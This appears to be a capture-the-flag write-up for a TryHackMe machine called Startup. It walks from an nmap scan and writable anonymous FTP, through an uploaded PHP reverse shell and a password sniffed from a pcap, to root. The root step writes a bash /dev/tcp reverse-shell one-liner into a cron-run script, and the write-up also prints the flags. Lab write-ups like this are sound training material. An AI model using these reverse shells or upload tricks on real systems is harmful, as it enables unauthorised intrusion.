### Nmap
```
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to 10.17.24.189
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 1
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
| drwxrwxrwx    2 65534    65534        4096 Nov 12  2020 ftp [NSE: writeable]
| -rw-r--r--    1 0        0          251631 Nov 12  2020 important.jpg
|_-rw-r--r--    1 0        0             208 Nov 12  2020 notice.txt
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.10 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 b9a60b841d2201a401304843612bab94 (RSA)
|   256 ec13258c182036e6ce910e1626eba2be (ECDSA)
|_  256 a2ff2a7281aaa29f55a4dc9223e6b43f (ED25519)
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Maintenance
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
```

### FTP

- got three files in ftp
```
┌─[glack@parrot]─[~/Desktop/THM/startup]
└──╼ $ls
important.jpg  notice.txt  test.log

```

- potential username in notice.txt
`but Maya is looking pretty sus.`




### HTTP

- ferox gives us path `/files`
- Here i can see that the ftp files are hosted and can be viewed from here, maybe we can also upload files on the ftp and maybe execute a php reverse shell
- namp showed that `/ftp` path in ftp is writable so we will upload the php revershell there
```
ftp> put revshell.php 
local: revshell.php remote: revshell.php
200 PORT command successful. Consider using PASV.
150 Ok to send data.
226 Transfer complete.
```

- I am able to see the uploaded file on `http://10.10.154.192/files/ftp/`
- started a netcat listener and executed the file on web and i got a shell
```
$ id
uid=33(www-data) gid=33(www-data) groups=33(www-data
```

### Priv Esc

- found one odd file at `/`
```
$ cat recipe.txt
Someone asked what our main ingredient to our spice soup is today. I figured I can't keep it a secret forever and told him it was love.
```

- Found another suspicious folder name `incidents`, it contains a `.pcap` file. I downlaoded it onto my system using `python3 -m http.server` 
and
```
┌─[✗]─[glack@parrot]─[~/Desktop/THM/startup/_important.jpg.extracted]
└──╼ $wget http://10.10.154.192:8000/suspicious.pcapng
```

- It contained a TCP stream where a user as `www-data` was trying to access `sudo -l` command using the password
```
Sorry, try again.

[sudo] password for www-data: c4ntg3t3n0ughsp1c3
```
Maybe this is the `lennie` use who forgot he is using `www-data` acount and was trying `sudo -l` command because he has access to it

### Priv Esc - root

- Switching used to lennie with above password worked

```
lennie@startup:~$ cat user.txt
cat user.txt
THM{03ce3d619b80ccbfb3b7fc81e46c0e79}
```

- Triying standard priv esc vectors: sudo -l, suid bit files, bash_history, cronjobs but no luck
- In this path there is a file that is getting updated every minute, maybe this is a cronjob set by root, lets investigate it more
- here `planner.sh` is running every minute and in the file it is executing multiple command

```
lennie@startup:~/scripts$ cat planner.sh
cat planner.sh
#!/bin/bash
echo $LIST > /home/lennie/scripts/startup_list.txt
/etc/print.sh
```

- i checked and we are able to write `/etc/print.sh` file
- Changed the contents of `print.sh` to
```
lennie@startup:/etc$ echo "bash -i >& /dev/tcp/10.17.24.189/9992 0>&1" > print.sh
<bash -i >& /dev/tcp/10.17.24.189/9992 0>&1" > print.sh
```
- started a nc listener on 9992 and got a root shell
```
bash: no job control in this shell
root@startup:~# 

root@startup:~# cat root.txt
cat root.txt
THM{f963aaa6a430f210222158ae15c3d76d}


```